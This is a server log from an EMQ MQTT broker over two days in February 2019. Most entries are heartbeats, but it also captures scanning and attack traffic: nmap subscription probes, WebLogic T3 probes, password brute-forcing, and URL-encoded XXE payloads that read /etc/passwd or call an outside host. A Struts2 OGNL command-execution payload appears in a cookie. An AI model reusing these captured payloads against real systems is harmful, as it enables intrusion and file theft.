+===== ALIVE Fri Feb 15 20:10:55 CST 2019
+
+===== ALIVE Fri Feb 15 20:25:55 CST 2019
+20:27:51.197 [error] Unexpected WS Request: GET /favicon.ico
+
+===== ALIVE Fri Feb 15 20:42:51 CST 2019
+
+===== ALIVE Fri Feb 15 20:57:51 CST 2019
+
+===== ALIVE Fri Feb 15 21:12:51 CST 2019
+
+===== ALIVE Fri Feb 15 21:27:51 CST 2019
+
+===== ALIVE Fri Feb 15 21:42:51 CST 2019
+
+===== ALIVE Fri Feb 15 21:57:51 CST 2019
+
+===== ALIVE Fri Feb 15 22:12:51 CST 2019
+
+===== ALIVE Fri Feb 15 22:27:51 CST 2019
+
+===== ALIVE Fri Feb 15 22:42:51 CST 2019
+
+===== ALIVE Fri Feb 15 22:57:52 CST 2019
+
+===== ALIVE Fri Feb 15 23:12:52 CST 2019
+
+===== ALIVE Fri Feb 15 23:27:52 CST 2019
+
+===== ALIVE Fri Feb 15 23:42:52 CST 2019
+
+===== ALIVE Fri Feb 15 23:57:52 CST 2019
+
+===== ALIVE Sat Feb 16 00:12:52 CST 2019
+
+===== ALIVE Sat Feb 16 00:27:52 CST 2019
+
+===== ALIVE Sat Feb 16 00:42:52 CST 2019
+
+===== ALIVE Sat Feb 16 00:57:52 CST 2019
+
+===== ALIVE Sat Feb 16 01:12:52 CST 2019
+
+===== ALIVE Sat Feb 16 01:27:52 CST 2019
+
+===== ALIVE Sat Feb 16 01:42:53 CST 2019
+
+===== ALIVE Sat Feb 16 01:57:53 CST 2019
+
+===== ALIVE Sat Feb 16 02:12:53 CST 2019
+
+===== ALIVE Sat Feb 16 02:27:53 CST 2019
+
+===== ALIVE Sat Feb 16 02:42:53 CST 2019
+
+===== ALIVE Sat Feb 16 02:57:53 CST 2019
+
+===== ALIVE Sat Feb 16 03:12:53 CST 2019
+
+===== ALIVE Sat Feb 16 03:27:53 CST 2019
+
+===== ALIVE Sat Feb 16 03:42:53 CST 2019
+03:44:33.938 [error] Client(nmapNRDBODGKZOQHTVHA@205.205.150.9:59473): Cannot SUBSCRIBE [{<<"$SYS/#">>,[{qos,0}]},{<<"#">>,[{qos,0}]}] for ACL Deny
+
+===== ALIVE Sat Feb 16 03:59:34 CST 2019
+
+===== ALIVE Sat Feb 16 04:14:34 CST 2019
+
+===== ALIVE Sat Feb 16 04:29:34 CST 2019
+
+===== ALIVE Sat Feb 16 04:44:34 CST 2019
+
+===== ALIVE Sat Feb 16 04:59:34 CST 2019
+
+===== ALIVE Sat Feb 16 05:14:34 CST 2019
+
+===== ALIVE Sat Feb 16 05:29:34 CST 2019
+
+===== ALIVE Sat Feb 16 05:44:34 CST 2019
+
+===== ALIVE Sat Feb 16 05:59:34 CST 2019
+
+===== ALIVE Sat Feb 16 06:14:34 CST 2019
+
+===== ALIVE Sat Feb 16 06:29:34 CST 2019
+
+===== ALIVE Sat Feb 16 06:44:35 CST 2019
+
+===== ALIVE Sat Feb 16 06:59:35 CST 2019
+
+===== ALIVE Sat Feb 16 07:14:35 CST 2019
+
+===== ALIVE Sat Feb 16 07:29:35 CST 2019
+
+===== ALIVE Sat Feb 16 07:44:35 CST 2019
+
+===== ALIVE Sat Feb 16 07:59:35 CST 2019
+08:00:27.542 [error] Unexpected WS Request: GET /
+08:00:27.654 [error] Unexpected WS Request: GET /
+
+===== ALIVE Sat Feb 16 08:15:27 CST 2019
+
+===== ALIVE Sat Feb 16 08:30:27 CST 2019
+
+===== ALIVE Sat Feb 16 08:45:27 CST 2019
+
+===== ALIVE Sat Feb 16 09:00:28 CST 2019
+
+===== ALIVE Sat Feb 16 09:15:28 CST 2019
+
+===== ALIVE Sat Feb 16 09:30:28 CST 2019
+
+===== ALIVE Sat Feb 16 09:45:28 CST 2019
+
+===== ALIVE Sat Feb 16 10:00:28 CST 2019
+
+===== ALIVE Sat Feb 16 10:15:28 CST 2019
+
+===== ALIVE Sat Feb 16 10:30:28 CST 2019
+
+===== ALIVE Sat Feb 16 10:45:28 CST 2019
+
+===== ALIVE Sat Feb 16 11:00:28 CST 2019
+
+===== ALIVE Sat Feb 16 11:15:28 CST 2019
+
+===== ALIVE Sat Feb 16 11:30:28 CST 2019
+
+===== ALIVE Sat Feb 16 11:45:29 CST 2019
+11:46:42.054 [error] Supervisor 'esockd_connection_sup - <0.1487.0>' had child connection started with mochiweb_http:start_link({emqttd_http,handle_request,[{state,#Fun<emqttd_http.2.90041999>}]}) at <0.6949.2> exit with reason no function clause matching emqttd_http:handle_request("/", {mochiweb_request,[{esockd_connection,[#Port<0.61469>,#Fun<esockd_transport.2.122912610>,[]]},'OPTIONS',...]}, 'OPTIONS') line 67 in context connection_crashed
+11:46:42.056 [error] Error in process <0.6949.2> on node 'emq@127.0.0.1' with exit value:
+{function_clause,[{emqttd_http,handle_request,["/",{mochiweb_request,[{esockd_connection,[#Port<0.61469>,#Fun<esockd_transport.2.122912610>,[]]},'OPTIONS',"/",{1,0},{0,nil}]},'OPTIONS'],[{file,"src/emqttd_http.erl"},{line,67}]},{mochiweb_http,headers,5,[{file,"src/mochiweb_http.erl"},{line,93}]}]}
+
+===== ALIVE Sat Feb 16 12:01:42 CST 2019
+
+===== ALIVE Sat Feb 16 12:16:42 CST 2019
+
+===== ALIVE Sat Feb 16 12:31:42 CST 2019
+
+===== ALIVE Sat Feb 16 12:46:42 CST 2019
+
+===== ALIVE Sat Feb 16 13:01:42 CST 2019
+
+===== ALIVE Sat Feb 16 13:16:42 CST 2019
+
+===== ALIVE Sat Feb 16 13:31:42 CST 2019
+
+===== ALIVE Sat Feb 16 13:46:42 CST 2019
+
+===== ALIVE Sat Feb 16 14:01:42 CST 2019
+
+===== ALIVE Sat Feb 16 14:16:42 CST 2019
+
+===== ALIVE Sat Feb 16 14:31:43 CST 2019
+
+===== ALIVE Sat Feb 16 14:46:43 CST 2019
+
+===== ALIVE Sat Feb 16 15:01:43 CST 2019
+
+===== ALIVE Sat Feb 16 15:16:43 CST 2019
+
+===== ALIVE Sat Feb 16 15:31:43 CST 2019
+
+===== ALIVE Sat Feb 16 15:46:43 CST 2019
+
+===== ALIVE Sat Feb 16 16:01:43 CST 2019
+
+===== ALIVE Sat Feb 16 16:16:43 CST 2019
+
+===== ALIVE Sat Feb 16 16:31:43 CST 2019
+
+===== ALIVE Sat Feb 16 16:46:43 CST 2019
+
+===== ALIVE Sat Feb 16 17:01:43 CST 2019
+
+===== ALIVE Sat Feb 16 17:16:43 CST 2019
+
+===== ALIVE Sat Feb 16 17:31:44 CST 2019
+
+===== ALIVE Sat Feb 16 17:46:44 CST 2019
+
+===== Sat Feb 16 17:52:59 CST 2019
+17:52:59.415 [error] SSL: hello: tls_handshake.erl:191:Fatal error: protocol version
+17:53:11.305 [error] Client(nmapJUOLVXQOEFLQJSOX@116.196.123.240:38356): Cannot SUBSCRIBE [{<<"$SYS/#">>,[{qos,0}]},{<<"#">>,[{qos,0}]}] for ACL Deny
+17:53:43.751 [error] SSL: hello: tls_handshake.erl:191:Fatal error: protocol version
+
+===== ALIVE Sat Feb 16 18:08:43 CST 2019
+
+===== ALIVE Sat Feb 16 18:23:43 CST 2019
+
+===== ALIVE Sat Feb 16 18:38:44 CST 2019
+
+===== ALIVE Sat Feb 16 18:53:44 CST 2019
+
+===== ALIVE Sat Feb 16 19:08:44 CST 2019
+
+===== ALIVE Sat Feb 16 19:23:44 CST 2019
+
+===== ALIVE Sat Feb 16 19:38:44 CST 2019
+
+===== ALIVE Sat Feb 16 19:53:44 CST 2019
+
+===== ALIVE Sat Feb 16 20:08:44 CST 2019
+
+===== ALIVE Sat Feb 16 20:23:44 CST 2019
+
+===== ALIVE Sat Feb 16 20:38:44 CST 2019
+
+===== ALIVE Sat Feb 16 20:53:44 CST 2019
+
+===== ALIVE Sat Feb 16 21:08:44 CST 2019
+
+===== ALIVE Sat Feb 16 21:23:44 CST 2019
+
+===== ALIVE Sat Feb 16 21:38:45 CST 2019
+
+===== ALIVE Sat Feb 16 21:53:45 CST 2019
+
+===== ALIVE Sat Feb 16 22:08:45 CST 2019
+
+===== ALIVE Sat Feb 16 22:23:45 CST 2019
+
+===== ALIVE Sat Feb 16 22:38:45 CST 2019
+
+===== ALIVE Sat Feb 16 22:53:45 CST 2019
+
+===== ALIVE Sat Feb 16 23:08:45 CST 2019
+
+===== ALIVE Sat Feb 16 23:23:45 CST 2019
+
+===== ALIVE Sat Feb 16 23:38:45 CST 2019
+
+===== Sat Feb 16 23:52:43 CST 2019
+23:52:43.224 [error] HTTP Auth failure: username=, reason="User not found"
+
+===== ALIVE Sun Feb 17 00:07:43 CST 2019
+
+===== ALIVE Sun Feb 17 00:22:43 CST 2019
+
+===== ALIVE Sun Feb 17 00:37:43 CST 2019
+
+===== ALIVE Sun Feb 17 00:52:43 CST 2019
+
+===== ALIVE Sun Feb 17 01:07:43 CST 2019
+
+===== ALIVE Sun Feb 17 01:22:43 CST 2019
+
+===== ALIVE Sun Feb 17 01:37:43 CST 2019
+
+===== ALIVE Sun Feb 17 01:52:43 CST 2019
+
+===== ALIVE Sun Feb 17 02:07:43 CST 2019
+
+===== ALIVE Sun Feb 17 02:22:44 CST 2019
+
+===== ALIVE Sun Feb 17 02:37:44 CST 2019
+
+===== ALIVE Sun Feb 17 02:52:44 CST 2019
+
+===== ALIVE Sun Feb 17 03:07:44 CST 2019
+
+===== ALIVE Sun Feb 17 03:22:44 CST 2019
+
+===== ALIVE Sun Feb 17 03:37:44 CST 2019
+
+===== ALIVE Sun Feb 17 03:52:44 CST 2019
+
+===== ALIVE Sun Feb 17 04:07:44 CST 2019
+
+===== ALIVE Sun Feb 17 04:22:44 CST 2019
+
+===== ALIVE Sun Feb 17 04:37:44 CST 2019
+
+===== ALIVE Sun Feb 17 04:52:45 CST 2019
+
+===== ALIVE Sun Feb 17 05:07:45 CST 2019
+
+===== ALIVE Sun Feb 17 05:22:45 CST 2019
+
+===== ALIVE Sun Feb 17 05:37:45 CST 2019
+
+===== ALIVE Sun Feb 17 05:52:45 CST 2019
+
+===== ALIVE Sun Feb 17 06:07:45 CST 2019
+
+===== ALIVE Sun Feb 17 06:22:45 CST 2019
+
+===== ALIVE Sun Feb 17 06:37:45 CST 2019
+
+===== ALIVE Sun Feb 17 06:52:45 CST 2019
+
+===== ALIVE Sun Feb 17 07:07:45 CST 2019
+
+===== ALIVE Sun Feb 17 07:22:45 CST 2019
+
+===== ALIVE Sun Feb 17 07:37:46 CST 2019
+
+===== ALIVE Sun Feb 17 07:52:46 CST 2019
+
+===== ALIVE Sun Feb 17 08:07:46 CST 2019
+
+===== ALIVE Sun Feb 17 08:22:46 CST 2019
+
+===== ALIVE Sun Feb 17 08:37:46 CST 2019
+
+===== ALIVE Sun Feb 17 08:52:46 CST 2019
+
+===== ALIVE Sun Feb 17 09:07:46 CST 2019
+
+===== ALIVE Sun Feb 17 09:22:46 CST 2019
+
+===== ALIVE Sun Feb 17 09:37:46 CST 2019
+
+===== ALIVE Sun Feb 17 09:52:46 CST 2019
+
+===== ALIVE Sun Feb 17 10:07:46 CST 2019
+
+===== ALIVE Sun Feb 17 10:22:46 CST 2019
+
+===== ALIVE Sun Feb 17 10:37:46 CST 2019
+
+===== ALIVE Sun Feb 17 10:52:47 CST 2019
+
+===== ALIVE Sun Feb 17 11:07:47 CST 2019
+11:08:24.131 [error] HTTP Auth failure: username=, reason="User not found"
+
+===== ALIVE Sun Feb 17 11:23:24 CST 2019
+
+===== ALIVE Sun Feb 17 11:38:24 CST 2019
+
+===== ALIVE Sun Feb 17 11:53:24 CST 2019
+
+===== ALIVE Sun Feb 17 12:08:24 CST 2019
+
+===== ALIVE Sun Feb 17 12:23:24 CST 2019
+
+===== ALIVE Sun Feb 17 12:38:24 CST 2019
+
+===== ALIVE Sun Feb 17 12:53:24 CST 2019
+
+===== ALIVE Sun Feb 17 13:08:24 CST 2019
+
+===== ALIVE Sun Feb 17 13:23:24 CST 2019
+
+===== ALIVE Sun Feb 17 13:38:25 CST 2019
+
+===== ALIVE Sun Feb 17 13:53:25 CST 2019
+
+===== ALIVE Sun Feb 17 14:08:25 CST 2019
+
+===== ALIVE Sun Feb 17 14:23:25 CST 2019
+
+===== ALIVE Sun Feb 17 14:38:25 CST 2019
+
+===== ALIVE Sun Feb 17 14:53:25 CST 2019
+
+===== ALIVE Sun Feb 17 15:08:25 CST 2019
+
+===== ALIVE Sun Feb 17 15:23:25 CST 2019
+
+===== ALIVE Sun Feb 17 15:38:25 CST 2019
+
+===== ALIVE Sun Feb 17 15:53:25 CST 2019
+
+===== ALIVE Sun Feb 17 16:08:25 CST 2019
+
+===== ALIVE Sun Feb 17 16:23:26 CST 2019
+
+===== ALIVE Sun Feb 17 16:38:26 CST 2019
+
+===== ALIVE Sun Feb 17 16:53:26 CST 2019
+
+===== ALIVE Sun Feb 17 17:08:26 CST 2019
+
+===== ALIVE Sun Feb 17 17:23:26 CST 2019
+
+===== ALIVE Sun Feb 17 17:38:26 CST 2019
+
+===== ALIVE Sun Feb 17 17:53:26 CST 2019
+
+===== ALIVE Sun Feb 17 18:08:26 CST 2019
+
+===== ALIVE Sun Feb 17 18:23:26 CST 2019
+18:27:53.195 [error] Supervisor 'esockd_connection_sup - <0.1487.0>' had child connection started with mochiweb_http:start_link({emqttd_http,handle_request,[{state,#Fun<emqttd_http.2.90041999>}]}) at <0.22766.3> exit with reason no function clause matching emqttd_http:handle_request("/", {mochiweb_request,[{esockd_connection,[#Port<0.83811>,#Fun<esockd_transport.2.122912610>,[]]},'OPTIONS',...]}, 'OPTIONS') line 67 in context connection_crashed
+18:27:53.196 [error] Error in process <0.22766.3> on node 'emq@127.0.0.1' with exit value:
+{function_clause,[{emqttd_http,handle_request,["/",{mochiweb_request,[{esockd_connection,[#Port<0.83811>,#Fun<esockd_transport.2.122912610>,[]]},'OPTIONS',"/",{1,0},{0,nil}]},'OPTIONS'],[{file,"src/emqttd_http.erl"},{line,67}]},{mochiweb_http,headers,5,[{file,"src/mochiweb_http.erl"},{line,93}]}]}
+18:27:54.616 [error] Unexpected WS Request: GET /
+18:27:55.829 [error] Unexpected WS Request: GET /nice ports,/Trinity.txt.bak
+18:28:07.479 [error] Unexpected WS Request: OPTIONS /
+
+===== Sun Feb 17 18:35:39 CST 2019
+18:35:39.654 [error] SSL: hello: tls_handshake.erl:191:Fatal error: protocol version
+
+===== Sun Feb 17 18:44:43 CST 2019
+18:44:43.687 [error] Unexpected WS Request: t3 12.2.1
+18:44:49.411 [error] Unexpected WS Request: t3 12.2.1
+18:44:54.879 [error] Unexpected WS Request: t3 12.2.1
+18:44:55.728 [error] Supervisor 'esockd_connection_sup - <0.1415.0>' had child connection started with mochiweb_http:start_link({emq_dashboard,handle_request,[{state,"/root/emqttd/lib/emq_dashboard-2.3.11/priv/www",#Fun<emq_das..>}]}) at <0.24457.3> exit with reason no case clause matching "12.2.1" in emq_dashboard:handle_request/2 line 87 in context connection_crashed
+18:44:55.729 [error] Error in process <0.24457.3> on node 'emq@127.0.0.1' with exit value:
+{{case_clause,"12.2.1"},[{emq_dashboard,handle_request,2,[{file,"src/emq_dashboard.erl"},{line,87}]},{mochiweb_http,headers,5,[{file,"src/mochiweb_http.erl"},{line,93}]}]}
+18:45:00.178 [error] Unexpected WS Request: t3 12.2.1
+18:45:01.078 [error] Supervisor 'esockd_connection_sup - <0.1415.0>' had child connection started with mochiweb_http:start_link({emq_dashboard,handle_request,[{state,"/root/emqttd/lib/emq_dashboard-2.3.11/priv/www",#Fun<emq_das..>}]}) at <0.24461.3> exit with reason no case clause matching "12.2.1" in emq_dashboard:handle_request/2 line 87 in context connection_crashed
+18:45:01.078 [error] Error in process <0.24461.3> on node 'emq@127.0.0.1' with exit value:
+{{case_clause,"12.2.1"},[{emq_dashboard,handle_request,2,[{file,"src/emq_dashboard.erl"},{line,87}]},{mochiweb_http,headers,5,[{file,"src/mochiweb_http.erl"},{line,93}]}]}
+18:45:06.309 [error] Supervisor 'esockd_connection_sup - <0.1415.0>' had child connection started with mochiweb_http:start_link({emq_dashboard,handle_request,[{state,"/root/emqttd/lib/emq_dashboard-2.3.11/priv/www",#Fun<emq_das..>}]}) at <0.24468.3> exit with reason no case clause matching "12.2.1" in emq_dashboard:handle_request/2 line 87 in context connection_crashed
+18:45:06.310 [error] Error in process <0.24468.3> on node 'emq@127.0.0.1' with exit value:
+{{case_clause,"12.2.1"},[{emq_dashboard,handle_request,2,[{file,"src/emq_dashboard.erl"},{line,87}]},{mochiweb_http,headers,5,[{file,"src/mochiweb_http.erl"},{line,93}]}]}
+18:45:13.113 [error] Supervisor 'esockd_connection_sup - <0.1415.0>' had child connection started with mochiweb_http:start_link({emq_dashboard,handle_request,[{state,"/root/emqttd/lib/emq_dashboard-2.3.11/priv/www",#Fun<emq_das..>}]}) at <0.24476.3> exit with reason no case clause matching "12.2.1" in emq_dashboard:handle_request/2 line 87 in context connection_crashed
+18:45:13.114 [error] Error in process <0.24476.3> on node 'emq@127.0.0.1' with exit value:
+{{case_clause,"12.2.1"},[{emq_dashboard,handle_request,2,[{file,"src/emq_dashboard.erl"},{line,87}]},{mochiweb_http,headers,5,[{file,"src/mochiweb_http.erl"},{line,93}]}]}
+18:48:06.808 [error] HTTP Auth failure: username=123456, reason="User not found" 
+18:48:06.874 [error] HTTP Auth failure: username=123456, reason="User not found" 
+18:48:11.066 [error] HTTP Auth failure: username=access, reason="User not found" 
+18:48:15.663 [error] HTTP Auth failure: username=123456, reason="User not found" 
+18:48:16.804 [error] HTTP Auth failure: username=access, reason="User not found" 
+18:48:25.007 [error] HTTP Auth failure: username=admin, reason="Password error"
+18:48:30.797 [error] HTTP Auth failure: username=admin, reason="Password error"
+18:48:31.328 [error] HTTP Auth failure: username=access, reason="User not found" 
+18:48:32.647 [error] HTTP Auth failure: username=administrator, reason="User not found"
+18:48:34.621 [error] HTTP Auth failure: username=admin, reason="Password error"
+18:48:38.321 [error] HTTP Auth failure: username=administrator, reason="User not found"
+18:48:41.936 [error] HTTP Auth failure: username=administrator, reason="User not found"
+18:48:42.619 [error] HTTP Auth failure: username=administrator, reason="User not found"
+18:48:43.364 [error] HTTP Auth failure: username=backup, reason="User not found" 
+18:48:44.979 [error] HTTP Auth failure: username=backup, reason="User not found" 
+18:48:45.883 [error] HTTP Auth failure: username=backup, reason="User not found" 
+18:48:49.277 [error] HTTP Auth failure: username=common, reason="User not found" 
+18:48:52.879 [error] HTTP Auth failure: username=backup, reason="User not found" 
+18:49:01.862 [error] HTTP Auth failure: username=common, reason="User not found" 
+18:49:03.149 [error] HTTP Auth failure: username=common, reason="User not found" 
+18:49:44.740 [error] Supervisor 'esockd_connection_sup - <0.1487.0>' had child connection started with mochiweb_http:start_link({emqttd_http,handle_request,[{state,#Fun<emqttd_http.2.90041999>}]}) at <0.24686.3> exit with reason no function clause matching emqttd_http:handle_request("/", {mochiweb_request,[{esockd_connection,[#Port<0.85279>,#Fun<esockd_transport.2.122912610>,[]]},'POST',...]}, 'POST') line 67 in context connection_crashed
+18:49:44.741 [error] Error in process <0.24686.3> on node 'emq@127.0.0.1' with exit value:
+{function_clause,[{emqttd_http,handle_request,["/",{mochiweb_request,[{esockd_connection,[#Port<0.85279>,#Fun<esockd_transport.2.122912610>,[]]},'POST',"/?=%3C%21DOCTYPE+foo+%5B%3C%21ELEMENT+foo+ANY+%3E%3C%21ENTITY+xxe+SYSTEM+%22http%3A%2F%2F116.196.112.30%3A8082%2F--37b6d21cb1f19c8a55e11238ecb5b33e--%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E",{1,1},{11,{"host",{'Host',"117.48.206.233:8080"},{"accept-encoding",{'Accept-Encoding',"identity"},{"accept",{'Accept',"*/*"},nil,{"accept-charset",{'Accept-Charset',"GBK,utf-8;q=0.7,*;q=0.3"},nil,nil}},{"accept-language",{'Accept-Language',"zh-CN,zh;q=0.8"},nil,{"cache-control",{'Cache-Control',"max-age=0"},nil,{"connection",{'Connection',"keep-alive"},nil,{"content-type",{'Content-Type',"application/xml"},{"content-length",{'Content-Length',"138"},nil,nil},nil}}}}},{"referer",{'Referer',"https://www.jdcloud.com"},nil,{"user-agent",{'User-Agent',"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0"},nil,nil}}}}]},'POST'],[{file,"src/emqttd_http.erl"},{line,67}]},{mochiweb_http,headers,5,[{file,"src/mochiweb_http.erl"},{line,93}]}]}
+18:49:45.467 [error] Supervisor 'esockd_connection_sup - <0.1487.0>' had child connection started with mochiweb_http:start_link({emqttd_http,handle_request,[{state,#Fun<emqttd_http.2.90041999>}]}) at <0.24689.3> exit with reason no function clause matching emqttd_http:handle_request("/", {mochiweb_request,[{esockd_connection,[#Port<0.85282>,#Fun<esockd_transport.2.122912610>,[]]},'POST',...]}, 'POST') line 67 in context connection_crashed
+18:49:45.469 [error] Error in process <0.24689.3> on node 'emq@127.0.0.1' with exit value:
+{function_clause,[{emqttd_http,handle_request,["/",{mochiweb_request,[{esockd_connection,[#Port<0.85282>,#Fun<esockd_transport.2.122912610>,[]]},'POST',"/?=%3C%21DOCTYPE+foo+%5B%3C%21ELEMENT+foo+ANY+%3E%3C%21ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E",{1,1},{11,{"host",{'Host',"117.48.206.233:8080"},{"accept-encoding",{'Accept-Encoding',"identity"},{"accept",{'Accept',"*/*"},nil,{"accept-charset",{'Accept-Charset',"GBK,utf-8;q=0.7,*;q=0.3"},nil,nil}},{"accept-language",{'Accept-Language',"zh-CN,zh;q=0.8"},nil,{"cache-control",{'Cache-Control',"max-age=0"},nil,{"connection",{'Connection',"keep-alive"},nil,{"content-type",{'Content-Type',"application/xml"},{"content-length",{'Content-Length',"93"},nil,nil},nil}}}}},{"referer",{'Referer',"https://www.jdcloud.com"},nil,{"user-agent",{'User-Agent',"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0"},nil,nil}}}}]},'POST'],[{file,"src/emqttd_http.erl"},{line,67}]},{mochiweb_http,headers,5,[{file,"src/mochiweb_http.erl"},{line,93}]}]}
+18:50:04.318 [error] Supervisor 'esockd_connection_sup - <0.1487.0>' had child connection started with mochiweb_http:start_link({emqttd_http,handle_request,[{state,#Fun<emqttd_http.2.90041999>}]}) at <0.24716.3> exit with reason no function clause matching emqttd_http:handle_request("/", {mochiweb_request,[{esockd_connection,[#Port<0.85306>,#Fun<esockd_transport.2.122912610>,[]]},'POST',...]}, 'POST') line 67 in context connection_crashed
+18:50:04.319 [error] Error in process <0.24716.3> on node 'emq@127.0.0.1' with exit value:
+{function_clause,[{emqttd_http,handle_request,["/",{mochiweb_request,[{esockd_connection,[#Port<0.85306>,#Fun<esockd_transport.2.122912610>,[]]},'POST',"/",{1,1},{11,{"host",{'Host',"117.48.206.233:8080"},{"accept-encoding",{'Accept-Encoding',"identity"},{"accept",{'Accept',"*/*"},nil,{"accept-charset",{'Accept-Charset',"GBK,utf-8;q=0.7,*;q=0.3"},nil,nil}},{"accept-language",{'Accept-Language',"zh-CN,zh;q=0.8"},nil,{"cache-control",{'Cache-Control',"max-age=0"},nil,{"connection",{'Connection',"keep-alive"},nil,{"content-type",{'Content-Type',"application/xml"},{"content-length",{'Content-Length',"1702"},nil,nil},nil}}}}},{"referer",{'Referer',"https://www.jdcloud.com"},nil,{"user-agent",{'User-Agent',"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0"},nil,nil}}}}]},'POST'],[{file,"src/emqttd_http.erl"},{line,67}]},{mochiweb_http,headers,5,[{file,"src/mochiweb_http.erl"},{line,93}]}]}
+18:50:10.375 [error] Supervisor 'esockd_connection_sup - <0.1487.0>' had child connection started with mochiweb_http:start_link({emqttd_http,handle_request,[{state,#Fun<emqttd_http.2.90041999>}]}) at <0.24731.3> exit with reason no function clause matching emqttd_http:handle_request("/", {mochiweb_request,[{esockd_connection,[#Port<0.85314>,#Fun<esockd_transport.2.122912610>,[]]},'POST',...]}, 'POST') line 67 in context connection_crashed
+18:50:10.376 [error] Error in process <0.24731.3> on node 'emq@127.0.0.1' with exit value:
+{function_clause,[{emqttd_http,handle_request,["/",{mochiweb_request,[{esockd_connection,[#Port<0.85314>,#Fun<esockd_transport.2.122912610>,[]]},'POST',"/",{1,1},{11,{"host",{'Host',"117.48.206.233:8080"},{"accept-encoding",{'Accept-Encoding',"identity"},{"accept",{'Accept',"*/*"},nil,{"accept-charset",{'Accept-Charset',"GBK,utf-8;q=0.7,*;q=0.3"},nil,nil}},{"accept-language",{'Accept-Language',"zh-CN,zh;q=0.8"},nil,{"cache-control",{'Cache-Control',"max-age=0"},nil,{"connection",{'Connection',"keep-alive"},nil,{"content-type",{'Content-Type',"application/xml"},{"content-length",{'Content-Length',"1702"},nil,nil},nil}}}}},{"referer",{'Referer',"https://www.jdcloud.com"},nil,{"user-agent",{'User-Agent',"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0"},nil,nil}}}}]},'POST'],[{file,"src/emqttd_http.erl"},{line,67}]},{mochiweb_http,headers,5,[{file,"src/mochiweb_http.erl"},{line,93}]}]}
+18:50:10.458 [error] Supervisor 'esockd_connection_sup - <0.1487.0>' had child connection started with mochiweb_http:start_link({emqttd_http,handle_request,[{state,#Fun<emqttd_http.2.90041999>}]}) at <0.24732.3> exit with reason no function clause matching emqttd_http:handle_request("/", {mochiweb_request,[{esockd_connection,[#Port<0.85315>,#Fun<esockd_transport.2.122912610>,[]]},'POST',...]}, 'POST') line 67 in context connection_crashed
+18:50:10.459 [error] Error in process <0.24732.3> on node 'emq@127.0.0.1' with exit value:
+{function_clause,[{emqttd_http,handle_request,["/",{mochiweb_request,[{esockd_connection,[#Port<0.85315>,#Fun<esockd_transport.2.122912610>,[]]},'POST',"/",{1,1},{11,{"host",{'Host',"117.48.206.233:8080"},{"accept-encoding",{'Accept-Encoding',"identity"},{"accept",{'Accept',"*/*"},nil,{"accept-charset",{'Accept-Charset',"GBK,utf-8;q=0.7,*;q=0.3"},nil,nil}},{"accept-language",{'Accept-Language',"zh-CN,zh;q=0.8"},nil,{"cache-control",{'Cache-Control',"max-age=0"},nil,{"connection",{'Connection',"keep-alive"},nil,{"content-type",{'Content-Type',"application/xml"},{"content-length",{'Content-Length',"1702"},nil,nil},nil}}}}},{"referer",{'Referer',"https://www.jdcloud.com"},nil,{"user-agent",{'User-Agent',"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0"},nil,nil}}}}]},'POST'],[{file,"src/emqttd_http.erl"},{line,67}]},{mochiweb_http,headers,5,[{file,"src/mochiweb_http.erl"},{line,93}]}]}
+18:50:21.373 [error] Supervisor 'esockd_connection_sup - <0.1487.0>' had child connection started with mochiweb_http:start_link({emqttd_http,handle_request,[{state,#Fun<emqttd_http.2.90041999>}]}) at <0.24755.3> exit with reason no function clause matching emqttd_http:handle_request("/", {mochiweb_request,[{esockd_connection,[#Port<0.85335>,#Fun<esockd_transport.2.122912610>,[]]},'POST',...]}, 'POST') line 67 in context connection_crashed
+18:50:21.374 [error] Error in process <0.24755.3> on node 'emq@127.0.0.1' with exit value:
+{function_clause,[{emqttd_http,handle_request,["/",{mochiweb_request,[{esockd_connection,[#Port<0.85335>,#Fun<esockd_transport.2.122912610>,[]]},'POST',"/",{1,1},{12,{"host",{'Host',"117.48.206.233:8080"},{"accept-encoding",{'Accept-Encoding',"identity"},{"accept",{'Accept',"*/*"},nil,{"accept-charset",{'Accept-Charset',"GBK,utf-8;q=0.7,*;q=0.3"},nil,nil}},{"accept-language",{'Accept-Language',"zh-CN,zh;q=0.8"},nil,{"cache-control",{'Cache-Control',"max-age=0"},nil,{"connection",{'Connection',"keep-alive"},nil,{"content-type",{'Content-Type',"application/x-www-form-urlencoded"},{"content-length",{'Content-Length',"0"},nil,nil},{"cookie",{'Cookie',"(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27echo%20a7a5366a90b76d2f02e5b741e7a516ac%27%29.getInputStream%28%29%29)=2"},nil,nil}}}}}},{"referer",{'Referer',"https://www.jdcloud.com"},nil,{"user-agent",{'User-Agent',"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0"},nil,nil}}}}]},'POST'],[{file,"src/emqttd_http.erl"},{line,67}]},{mochiweb_http,headers,5,[{file,"src/mochiweb_http.erl"},{line,93}]}]}
+18:50:21.462 [error] Supervisor 'esockd_connection_sup - <0.1487.0>' had child connection started with mochiweb_http:start_link({emqttd_http,handle_request,[{state,#Fun<emqttd_http.2.90041999>}]}) at <0.24756.3> exit with reason no function clause matching emqttd_http:handle_request("/", {mochiweb_request,[{esockd_connection,[#Port<0.85336>,#Fun<esockd_transport.2.122912610>,[]]},'POST',...]}, 'POST') line 67 in context connection_crashed
+18:50:21.463 [error] Error in process <0.24756.3> on node 'emq@127.0.0.1' with exit value:
